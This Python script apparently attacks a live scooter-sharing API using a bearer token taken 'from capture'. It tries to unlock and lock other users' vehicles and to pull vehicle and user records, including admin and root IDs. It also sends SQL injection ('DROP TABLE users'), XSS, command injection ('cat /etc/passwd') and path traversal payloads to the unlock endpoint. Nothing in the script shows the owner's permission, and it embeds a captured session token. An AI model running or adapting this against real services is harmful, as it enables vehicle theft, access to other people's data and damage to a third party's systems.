#!/usr/bin/env python3
"""
Test Other Vulnerabilities
Check for additional security vulnerabilities beyond admin escalation
"""

import requests
import json
import time
import re
from datetime import datetime

# API Configuration
BASE_URL = "https://api.knotcity.io"

# Fresh token from capture
FRESH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDM0OTMsInNlc3Npb25faWQiOiI3NmM0NzE3ZS03ZWM5LTRkN2MtOWRlOS00NjRiNjJlY2VhYzgiLCJpYXQiOjE3NTk0NTQ3NjQsImV4cCI6MTc1OTQ1ODM2NH0.ivnhjjDy1zEtAD1BTJAAK5V1vDtAaSHNuHZWpMspSFE"

def test_mass_unlock_vulnerability():
    """Test if we can unlock multiple scooters with the same token"""
    print("=" * 80)
    print("[VULNERABILITY TEST] MASS UNLOCK VULNERABILITY")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test different scooter IDs to see if we can unlock others
    test_scooters = [
        "TUF061",  # Known working
        "SXB306",  # Should fail
        "ABC123",  # Random scooter
        "XYZ789",  # Random scooter
        "TEST01",  # Test scooter
        "DEMO01",  # Demo scooter
    ]
    
    successful_unlocks = []
    
    for scooter in test_scooters:
        print(f"\n[TEST] Trying to unlock {scooter}")
        
        payload = {
            "serial_number": scooter,
            "lat": 48.8566,
            "lng": 2.3522
        }
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=headers,
                json=payload,
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] {scooter} UNLOCKED!")
                successful_unlocks.append(scooter)
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied for {scooter}")
            elif response.status_code == 401:
                print(f"   [ERROR] Token expired/invalid")
            else:
                print(f"   [INFO] Status {response.status_code} for {scooter}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_unlocks

def test_lock_vulnerability():
    """Test if we can lock scooters we shouldn't have access to"""
    print("\n" + "=" * 80)
    print("[VULNERABILITY TEST] LOCK VULNERABILITY")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test lock endpoint with different pass IDs
    test_pass_ids = [
        "qb.q@9243539",  # From capture logs
        "u.S@d591c73",   # From capture logs
        "fake@123456",   # Fake pass ID
        "test@999999",   # Test pass ID
    ]
    
    successful_locks = []
    
    for pass_id in test_pass_ids:
        print(f"\n[TEST] Trying to lock with Pass ID: {pass_id}")
        
        payload = {
            "pass_id": pass_id
        }
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/freefloat/lock",
                headers=headers,
                json=payload,
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] LOCKED with Pass ID: {pass_id}!")
                successful_locks.append(pass_id)
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied for Pass ID: {pass_id}")
            elif response.status_code == 401:
                print(f"   [ERROR] Token expired/invalid")
            else:
                print(f"   [INFO] Status {response.status_code} for Pass ID: {pass_id}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_locks

def test_vehicle_info_vulnerability():
    """Test if we can get information about vehicles we shouldn't have access to"""
    print("\n" + "=" * 80)
    print("[VULNERABILITY TEST] VEHICLE INFO VULNERABILITY")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test different endpoints for vehicle information
    test_endpoints = [
        "/api/application/vehicles",
        "/api/application/vehicles/TUF061",
        "/api/application/vehicles/SXB306",
        "/api/application/vehicles/info",
        "/api/application/vehicles/list",
        "/api/application/vehicles/nearby",
        "/api/application/vehicles/status",
    ]
    
    successful_info_access = []
    
    for endpoint in test_endpoints:
        print(f"\n[TEST] Trying endpoint: {endpoint}")
        
        try:
            response = requests.get(
                f"{BASE_URL}{endpoint}",
                headers=headers,
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text[:200]}{'...' if len(response.text) > 200 else ''}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] Access granted to {endpoint}!")
                successful_info_access.append(endpoint)
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied for {endpoint}")
            elif response.status_code == 401:
                print(f"   [ERROR] Token expired/invalid")
            else:
                print(f"   [INFO] Status {response.status_code} for {endpoint}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_info_access

def test_user_info_vulnerability():
    """Test if we can access other users' information"""
    print("\n" + "=" * 80)
    print("[VULNERABILITY TEST] USER INFO VULNERABILITY")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test different user-related endpoints
    test_endpoints = [
        "/api/application/user",
        "/api/application/user/profile",
        "/api/application/user/info",
        "/api/application/user/settings",
        "/api/application/user/history",
        "/api/application/user/sessions",
        "/api/application/users",
        "/api/application/users/103493",  # Current user ID
        "/api/application/users/1",       # Admin user ID
        "/api/application/users/0",       # Root user ID
    ]
    
    successful_user_access = []
    
    for endpoint in test_endpoints:
        print(f"\n[TEST] Trying endpoint: {endpoint}")
        
        try:
            response = requests.get(
                f"{BASE_URL}{endpoint}",
                headers=headers,
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text[:200]}{'...' if len(response.text) > 200 else ''}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] Access granted to {endpoint}!")
                successful_user_access.append(endpoint)
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied for {endpoint}")
            elif response.status_code == 401:
                print(f"   [ERROR] Token expired/invalid")
            else:
                print(f"   [INFO] Status {response.status_code} for {endpoint}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_user_access

def test_parameter_injection_vulnerability():
    """Test for parameter injection vulnerabilities"""
    print("\n" + "=" * 80)
    print("[VULNERABILITY TEST] PARAMETER INJECTION VULNERABILITY")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test different injection payloads
    injection_tests = [
        {
            "name": "SQL Injection in serial_number",
            "payload": {
                "serial_number": "TUF061'; DROP TABLE users; --",
                "lat": 48.8566,
                "lng": 2.3522
            }
        },
        {
            "name": "XSS in serial_number",
            "payload": {
                "serial_number": "<script>alert('XSS')</script>",
                "lat": 48.8566,
                "lng": 2.3522
            }
        },
        {
            "name": "Command Injection in serial_number",
            "payload": {
                "serial_number": "TUF061; cat /etc/passwd",
                "lat": 48.8566,
                "lng": 2.3522
            }
        },
        {
            "name": "Path Traversal in serial_number",
            "payload": {
                "serial_number": "../../../etc/passwd",
                "lat": 48.8566,
                "lng": 2.3522
            }
        },
        {
            "name": "JSON Injection",
            "payload": {
                "serial_number": "TUF061",
                "lat": 48.8566,
                "lng": 2.3522,
                "extra_field": "{\"admin\": true}"
            }
        }
    ]
    
    successful_injections = []
    
    for test in injection_tests:
        print(f"\n[TEST] {test['name']}")
        print(f"   Payload: {json.dumps(test['payload'], indent=2)}")
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=headers,
                json=test['payload'],
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] Injection successful!")
                successful_injections.append(test['name'])
            elif response.status_code == 400:
                print(f"   [BLOCKED] Bad request - injection blocked")
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied")
            else:
                print(f"   [INFO] Status {response.status_code}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_injections

def main():
    print("=" * 80)
    print("[COMPREHENSIVE] OTHER VULNERABILITIES TEST")
    print("=" * 80)
    print("[WARNING] Testing for additional security vulnerabilities!")
    print("=" * 80)
    
    # Test different vulnerability types
    mass_unlock_results = test_mass_unlock_vulnerability()
    lock_results = test_lock_vulnerability()
    vehicle_info_results = test_vehicle_info_vulnerability()
    user_info_results = test_user_info_vulnerability()
    injection_results = test_parameter_injection_vulnerability()
    
    # Summary
    print("\n" + "=" * 80)
    print("[RESULTS] VULNERABILITY TEST RESULTS")
    print("=" * 80)
    
    print(f"\n[MASS UNLOCK] Results:")
    if mass_unlock_results:
        print(f"   [CRITICAL] {len(mass_unlock_results)} scooters unlocked: {mass_unlock_results}")
    else:
        print(f"   [OK] No unauthorized scooter unlocks")
    
    print(f"\n[LOCK VULNERABILITY] Results:")
    if lock_results:
        print(f"   [CRITICAL] {len(lock_results)} unauthorized locks: {lock_results}")
    else:
        print(f"   [OK] No unauthorized locks")
    
    print(f"\n[VEHICLE INFO] Results:")
    if vehicle_info_results:
        print(f"   [HIGH] {len(vehicle_info_results)} info endpoints accessible: {vehicle_info_results}")
    else:
        print(f"   [OK] No unauthorized vehicle info access")
    
    print(f"\n[USER INFO] Results:")
    if user_info_results:
        print(f"   [HIGH] {len(user_info_results)} user endpoints accessible: {user_info_results}")
    else:
        print(f"   [OK] No unauthorized user info access")
    
    print(f"\n[INJECTION] Results:")
    if injection_results:
        print(f"   [CRITICAL] {len(injection_results)} injection vulnerabilities: {injection_results}")
    else:
        print(f"   [OK] No injection vulnerabilities found")
    
    print("=" * 80)

if __name__ == "__main__":
    main()
